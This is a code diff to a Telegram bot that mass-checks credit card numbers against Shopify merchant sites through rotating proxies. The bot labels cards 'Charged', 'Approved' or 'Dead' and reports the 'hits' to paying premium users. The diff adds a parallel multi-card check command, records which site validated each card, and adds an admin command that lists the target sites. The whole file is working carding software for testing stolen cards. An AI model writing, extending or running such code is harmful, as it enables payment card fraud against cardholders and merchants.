@@ -247,10 +247,10 @@ async def check_card(card, site, proxy):
             return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}
 
     except asyncio.TimeoutError:
-        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
+        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True, 'site': site}
     except Exception as e:
         error_msg = str(e)
-        return {'status': 'Dead', 'message': error_msg, 'card': card, 'gateway': 'Unknown', 'price': '-'}
+        return {'status': 'Dead', 'message': error_msg, 'card': card, 'gateway': 'Unknown', 'price': '-', 'site': site}
 
 async def check_card_with_retry(card, sites, proxies, max_retries=2):
     last_result = None
@@ -272,7 +272,7 @@ async def check_card_with_retry(card, sites, proxies, max_retries=2):
             await asyncio.sleep(0.3)
 
     if last_result:
-        return {'status': 'Dead', 'message': f'Site errors: {last_result["message"]}', 'card': card, 'gateway': last_result.get('gateway', 'Unknown'), 'price': last_result.get('price', '-'), 'site': 'Multiple'}
+        return {'status': 'Dead', 'message': f'Site errors: {last_result["message"]}', 'card': card, 'gateway': last_result.get('gateway', 'Unknown'), 'price': last_result.get('price', '-'), 'site': last_result.get('site', 'Unknown')}
 
     return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-'}
 
@@ -365,17 +365,17 @@ Hits:
         
         await f.write(f"CHARGED ({len(results['charged'])}):\n")
         for r in results['charged']:
-            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")
+            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r.get('site', 'Unknown')} | {r['message'][:100]}\n")
         await f.write("\n")
         
         await f.write(f"APPROVED ({len(results['approved'])}):\n")
         for r in results['approved']:
-            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")
+            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r.get('site', 'Unknown')} | {r['message'][:100]}\n")
         await f.write("\n")
         
         await f.write(f"DECLINED ({len(results['dead'])}):\n")
         for r in results['dead']:
-            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")
+            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r.get('site', 'Unknown')} | {r['message'][:100]}\n")
 
     await bot.send_message(user_id, premium_emoji(summary), file=filename, parse_mode='html')
 
@@ -478,6 +478,7 @@ async def show_commands_callback(event):
 
 🛒 Shopify
 ├─ <code>/cc cc|mm|yy|cvv</code> → Check single card
+├─ <code>/mcc</code> → Multi check (2-20 cards)
 └─ <code>/chk</code> → Mass check from .txt file
 
 🔧 Site Management
@@ -496,7 +497,6 @@ async def show_commands_callback(event):
     buttons = [[Button.inline(" Back", b"main_menu", style="danger")]]
     
     await event.edit(premium_emoji(commands_text), buttons=buttons, parse_mode='html')
-    
 @bot.on(events.CallbackQuery(data=b"admin_panel"))
 async def admin_panel_callback(event):
     user_id = event.sender_id
@@ -518,11 +518,11 @@ async def admin_panel_callback(event):
 
 📊 <b>Bot Statistics</b>
 └─ <code>/stats</code> → Show bot statistics"""
-
+    
     buttons = [[Button.inline(" Back", b"main_menu", style="danger")]]
     
     await event.edit(premium_emoji(admin_text), buttons=buttons, parse_mode='html')
-    
+
 @bot.on(events.CallbackQuery(data=b"main_menu"))
 async def main_menu_callback(event):
     user_id = event.sender_id
@@ -612,6 +612,153 @@ async def single_cc_check(event):
 
     except Exception as e:
         await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
+
+
+# ══════════════════════════════════════════════════════════════
+# 🆕 /mcc — Multi CC Check (2–20 cards, batch parallel)
+# ══════════════════════════════════════════════════════════════
+@bot.on(events.NewMessage(pattern=r'^/mcc\s+'))
+async def multi_cc_check(event):
+    user_id = event.sender_id
+
+    try:
+        sender = await event.get_sender()
+        username = sender.username if sender.username else f"user_{user_id}"
+    except:
+        username = f"user_{user_id}"
+
+    if not is_premium(user_id):
+        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this bot."), parse_mode='html')
+        return
+
+    sites = load_sites()
+    proxies = load_proxies()
+
+    if not sites:
+        await event.reply(premium_emoji("❌ No sites available. Please contact admin."), parse_mode='html')
+        return
+    if not proxies:
+        await event.reply(premium_emoji("❌ No proxies available. Please add proxies."), parse_mode='html')
+        return
+
+    cc_input = event.message.text.split(' ', 1)[1].strip()
+    cards = extract_cc(cc_input)
+
+    if not cards:
+        await event.reply(
+            premium_emoji("❌ No valid CC found.\n\n📝 Usage: <code>/mcc</code> followed by cards (one per line).\n\nExample:\n<code>/mcc\n4111111111111111|12|25|123\n5222222222222222|01|26|456</code>"),
+            parse_mode='html'
+        )
+        return
+
+    if len(cards) > 20:
+        cards = cards[:20]
+
+    total_cards = len(cards)
+    status_msg = await event.reply(
+        premium_emoji(f"🔥 Starting batch check for <b>{total_cards}</b> cards..."),
+        parse_mode='html'
+    )
+
+    session_key = f"{user_id}_{status_msg.id}"
+    active_sessions[session_key] = {'paused': False}
+
+    all_results = {
+        'charged': [],
+        'approved': [],
+        'dead': [],
+        'total': total_cards,
+        'checked': 0,
+        'start_time': time.time(),
+        'last_card': '',
+        'last_response': '',
+        'last_price': '-',
+        'last_gateway': 'Unknown'
+    }
+
+    try:
+        queue = asyncio.Queue()
+        for card in cards:
+            queue.put_nowait(card)
+
+        last_update_time = [time.time()]
+
+        async def worker():
+            while not queue.empty() and session_key in active_sessions:
+                session_state = active_sessions.get(session_key)
+                if not session_state:
+                    break
+                while session_state.get('paused', False):
+                    await asyncio.sleep(1)
+                    session_state = active_sessions.get(session_key)
+                    if not session_state:
+                        return
+
+                try:
+                    card = queue.get_nowait()
+                except asyncio.QueueEmpty:
+                    break
+
+                current_sites = load_sites()
+                current_proxies = load_proxies()
+                if not current_sites or not current_proxies:
+                    break
+
+                res = await check_card_with_retry(card, current_sites, current_proxies, max_retries=1)
+
+                all_results['checked'] += 1
+                all_results['last_card'] = card
+                all_results['last_response'] = res.get('message', '')[:50]
+                all_results['last_price'] = res.get('price', '-')
+                all_results['last_gateway'] = res.get('gateway', 'Unknown')
+
+                if res['status'] == 'Charged':
+                    all_results['charged'].append(res)
+                    await send_realtime_hit(user_id, res, 'Charged', username)
+                elif res['status'] == 'Approved':
+                    all_results['approved'].append(res)
+                    await send_realtime_hit(user_id, res, 'Approved', username)
+                else:
+                    all_results['dead'].append(res)
+
+                queue.task_done()
+
+                now = time.time()
+                if now - last_update_time[0] >= 1.0:
+                    last_update_time[0] = now
+                    if session_key in active_sessions:
+                        try:
+                            await update_progress(user_id, status_msg.id, all_results, all_results['checked'])
+                        except Exception:
+                            pass
+
+        workers = [asyncio.create_task(worker()) for _ in range(10)]
+
+        while workers:
+            if session_key not in active_sessions:
+                for w in workers:
+                    if not w.done():
+                        w.cancel()
+                break
+            done, pending = await asyncio.wait(workers, timeout=1.0)
+            workers = list(pending)
+
+        if session_key in active_sessions:
+            await update_progress(user_id, status_msg.id, all_results, all_results['checked'])
+
+    except Exception as e:
+        await bot.send_message(user_id, premium_emoji(f"❌ An error occurred: {e}"), parse_mode='html')
+    finally:
+        if session_key in active_sessions:
+            del active_sessions[session_key]
+
+        try:
+            await status_msg.delete()
+        except:
+            pass
+
+        await send_final_results(user_id, all_results)
+
 
 @bot.on(events.NewMessage(pattern='/chk'))
 async def check_command(event):
@@ -1008,6 +1155,43 @@ async def get_all_proxies(event):
             os.remove(filename)
         except:
             pass
+
+
+# ══════════════════════════════════════════════════════════════
+# 🆕 /getsites — Download current sites.txt (Admin only)
+# ══════════════════════════════════════════════════════════════
+@bot.on(events.NewMessage(pattern='/getsites'))
+async def get_all_sites(event):
+    user_id = event.sender_id
+
+    if user_id not in ADMIN_ID:
+        await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
+        return
+
+    current_sites = load_sites()
+
+    if not current_sites:
+        await event.reply(premium_emoji("❌ No sites in sites.txt"), parse_mode='html')
+        return
+
+    if len(current_sites) <= 50:
+        site_list = "\n".join([f"{i+1}. <code>{s}</code>" for i, s in enumerate(current_sites)])
+        await event.reply(premium_emoji(f"📋 All Sites ({len(current_sites)}):\n\n{site_list}"), parse_mode='html')
+    else:
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"sites_{user_id}_{timestamp}.txt"
+
+        async with aiofiles.open(filename, 'w') as f:
+            for i, site in enumerate(current_sites):
+                await f.write(f"{i+1}. {site}\n")
+
+        await event.reply(premium_emoji(f"📋 All Sites ({len(current_sites)}):\n\nFile attached below."), file=filename, parse_mode='html')
+
+        try:
+            os.remove(filename)
+        except:
+            pass
+
 
 @bot.on(events.NewMessage(pattern='/site'))
 async def site_command(event):
